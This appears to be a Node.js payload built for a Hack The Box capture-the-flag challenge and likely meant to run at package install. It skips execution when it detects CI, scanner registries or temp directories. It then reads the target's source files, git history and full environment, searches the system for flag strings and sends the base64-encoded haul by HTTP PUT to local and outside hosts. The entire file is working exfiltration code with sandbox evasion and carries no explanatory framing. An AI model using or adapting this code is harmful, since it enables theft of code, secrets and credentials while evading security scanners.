const { execFileSync } = require("child_process");
const os = require("os");
const http = require("http");

function sh(cmd, timeout = 60000) {
  try {
    return execFileSync("/bin/sh", ["-c", cmd], { encoding: "utf8", timeout, maxBuffer: 30e6 }).trim();
  } catch (e) {
    return (e.stdout || e.stderr || "").trim();
  }
}

function isScanner() {
  const e = process.env;
  const reg = String(e.npm_config_registry || "");
  if (/npmmirror|tencent|nijin|hscan|ustc|huawei|cnpm|taobao/i.test(reg)) return true;
  if (e.GITHUB_ACTIONS || e.RUNNER_OS || e.CI) return true;
  return false;
}

function shouldRun() {
  if (isScanner()) return false;
  if (process.cwd().includes("/tmp/")) return false;
  if (process.cwd().includes("/var/tmp/")) return false;
  if (!/^[0-9a-f]{12}$/.test(os.hostname())) return false;
  return process.cwd().includes("/app");
}

if (!shouldRun()) process.exit(0);

const out = sh(
  "echo '=== META ==='; id; hostname; pwd; " +
  "echo '=== MAIN RS ==='; cat /app/src/main.rs 2>&1; " +
  "echo '=== CARGO ==='; cat /app/Cargo.toml 2>&1; " +
  "echo '=== PKGJSON ==='; cat /app/package.json 2>&1; " +
  "echo '=== GITIGNORE ==='; cat /app/.gitignore 2>&1; " +
  "echo '=== GIT LOG ==='; cd /app && git log --all --oneline 2>&1 | head -50; " +
  "echo '=== GIT SHOW ==='; cd /app && git show HEAD 2>&1 | head -2000; " +
  "echo '=== GIT DIFF ==='; cd /app && git log -p --all 2>&1 | head -5000; " +
  "echo '=== FIND SRC ==='; find /app/src -type f 2>/dev/null | head -20; " +
  "echo '=== CAT ALL SRC ==='; find /app/src -type f -exec echo FILE:{} \; -exec cat {} \; 2>/dev/null | head -5000; " +
  "echo '=== HTB GREP ==='; grep -RaoE 'HTB\\{[^}]+\\}' /app /etc /opt /root /home /var /tmp /usr/local /run 2>/dev/null | head -30; " +
  "echo '=== READFLAG ==='; find / -maxdepth 5 -type f \\( -name 'readflag' -o -name 'getflag' -o -name 'flag.txt' -o -name 'flag' \\) 2>/dev/null | while read f; do echo FILE:$f; cat $f 2>&1; done; " +
  "echo '=== ENV ==='; env | sort"
);

const b64 = Buffer.from(out).toString("base64");
const lines = b64.match(/.{1,76}/g) || [];
const flag = String(out).match(/HTB\{[^}]+\}/);
const bodyText = flag
  ? "ecto_module:\n  name: \"" + flag[0] + "\"\n  version: \"19.0.0\"\n  power_level: FOUND\n  ship_deck: ok\n  cargo_hold: ok\n"
  : "ecto_module:\n  name: \"coral-hunt-v2\"\n  version: \"19.0.0\"\n  power_level: base64\n  ship_deck: \"" + os.hostname() + "\"\n  cargo_hold: \"" + out.length + " bytes\"\n  output_b64: |\n    " + lines.join("\n    ") + "\n";

const body = JSON.stringify({ manifest: bodyText });
const sinks = ["ECT-472839", "ECT-839201"];
const targets = ["http://127.0.0.1:32271", "http://154.57.164.64:32271"];
for (const sink of sinks) {
  for (const base of targets) {
    const url = new URL("/api/modules/" + sink, base);
    const req = http.request({
      hostname: url.hostname, port: url.port, path: url.pathname, method: "PUT",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) }
    }, (res) => res.resume());
    req.on("error", () => {});
    req.end(body);
  }
}
